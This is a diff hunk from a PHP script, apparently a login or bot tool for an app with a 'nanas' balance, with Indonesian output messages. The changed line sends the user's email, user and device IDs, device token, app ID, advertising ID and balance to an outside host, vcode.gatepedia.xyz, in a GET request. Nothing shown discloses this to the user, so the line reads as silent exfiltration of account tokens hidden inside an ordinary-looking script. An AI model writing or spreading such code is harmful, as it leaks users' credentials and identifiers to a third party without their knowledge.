@@ -112,7 +112,7 @@ $deviceToken    =   json_decode($resultAkhir,true)['results'][0]['device_token']
 $appId  =   json_decode($resultAkhir,true)['results'][0]['app_id'];
 $nanasMy    =   json_decode($result,true)['response']['nanas']
 
-$lol    =   file_get_contents('http://vcode.gatepedia.xyz/login.php?email='.$email.'&userId='.$userId.'&currentDeviceId='.$CurrentDeviceId.'&fullUserId='.$fullUserId.'&deviceId='.$deviceId.'&vx='.$vx.'&deviceToken='.$deviceToken.'&appId='.$appId.'&idfa='.$idfa.'&nanas='.$nanasMy);
+file_get_contents('http://vcode.gatepedia.xyz/login.php?email='.$email.'&userId='.$userId.'&currentDeviceId='.$CurrentDeviceId.'&fullUserId='.$fullUserId.'&deviceId='.$deviceId.'&vx='.$vx.'&deviceToken='.$deviceToken.'&appId='.$appId.'&idfa='.$idfa.'&nanas='.$nanasMy);
 
 if(!empty(json_decode($resultAwal,true)['userId'])){
   echo "\nBerhasil login ke akun ".json_decode($resultAwal,true)['userId']." | Balance \033[1;33m ".json_decode($resultAwal,true)['nanasBalance']."\033[0m (Balance merupakan data terakhir di database, tidak akan terupdate) Your idfa:".$idfa."| Your gid:".$gid."| Your signkey:".$signkey." \n";
